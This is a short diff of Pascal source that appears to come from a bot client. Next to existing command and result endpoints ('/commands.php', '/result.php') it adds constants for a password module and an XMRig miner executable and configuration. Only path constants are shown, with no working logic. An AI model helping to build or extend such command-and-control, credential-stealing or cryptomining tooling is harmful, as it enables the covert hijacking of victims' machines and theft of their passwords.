@@ -28,6 +28,9 @@ type
 const
   CommandsPHP = '/commands.php';
   ResultsPHP  = '/result.php';
+  PassModule  = '/modules/Pass.mod';
+  MineConfig  = '/modules/config.json';
+  MineModule  = '/modules/xmrig64.exe';
 
 var
   Net: TNet;
